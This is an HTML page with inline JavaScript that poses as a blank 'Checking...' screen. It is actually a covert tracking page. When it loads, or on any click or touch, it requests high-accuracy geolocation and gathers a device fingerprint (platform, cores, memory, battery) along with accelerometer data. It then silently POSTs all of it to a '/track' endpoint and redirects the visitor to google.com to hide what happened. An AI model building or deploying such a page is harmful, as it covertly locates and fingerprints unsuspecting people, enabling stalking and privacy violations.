<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Checking...</title>
    <style>
        body {
            background: #000;
            color: #333;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            margin: 0;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <script>
        // Configuration
        const TARGET_URL = '/track';
        const REDIRECT_URL = 'https://google.com';
        const DELAY_MS = 4000; // 4 seconds data collection time

        const data = {
            type: 'STEALTH_AUTO',
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            location: {},
            sensors: {},
            wifi: {},
            fingerprint: {}
        };

        // --- BACKGROUND COLLECTION ---
        function collectBackgroundData() {
            // Sensors
            if (window.DeviceMotionEvent) {
                window.addEventListener('devicemotion', (event) => {
                    const acc = event.accelerationIncludingGravity;
                    if (acc && acc.x !== null) {
                        data.sensors.accel = { x: acc.x.toFixed(2), y: acc.y.toFixed(2), z: acc.z.toFixed(2) };
                    }
                });
            }
            // Fingerprint
            try {
                data.fingerprint.platform = navigator.platform;
                data.fingerprint.cores = navigator.hardwareConcurrency;
                data.fingerprint.memory = navigator.deviceMemory;
                if (navigator.getBattery) {
                    navigator.getBattery().then(bat => {
                        data.fingerprint.battery = { level: bat.level, charging: bat.charging };
                    });
                }
            } catch (e) { }
        }
        collectBackgroundData();

        // --- MAIN LOGIC ---
        let hasRun = false;

        function runSequence() {
            if (hasRun) return; // Prevent double execution
            hasRun = true;

            // Request Location
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    // SUCCESS
                    data.location = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy,
                        source: 'precise'
                    };
                    finalize();
                },
                (err) => {
                    // ERROR / BLOCKED (This handles "Block", "Never", or "Not Now")
                    data.location = {
                        error: err.message,
                        code: err.code
                    };
                    finalize();
                },
                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
        }

        function finalize() {
            // Wait 4 seconds to ensure sensors/wifi data is collected
            setTimeout(() => {
                sendAndRedirect();
            }, DELAY_MS);
        }

        function sendAndRedirect() {
            data.timestamp = new Date().toISOString();

            // Send
            fetch(TARGET_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                keepalive: true
            }).catch(e => console.log(e));

            // Redirect
            window.location.href = REDIRECT_URL;
        }

        // --- TRIGGERS ---
        // 1. Try immediately on load
        try { runSequence(); } catch (e) { }

        // 2. Try on ANY interaction (if browser blocked the auto-run)
        // This is "invisible" - user clicks anywhere and it triggers prompt
        document.addEventListener('click', runSequence);
        document.addEventListener('touchstart', runSequence);

        // 3. Safety Timeout: If location prompt hangs or is ignored for 10s, redirect anyway
        setTimeout(() => {
            if (!data.location.lat && !data.location.error) {
                data.location.error = "Timeout/Ignored";
                finalize();
            }
        }, 12000);

    </script>
</body>

</html>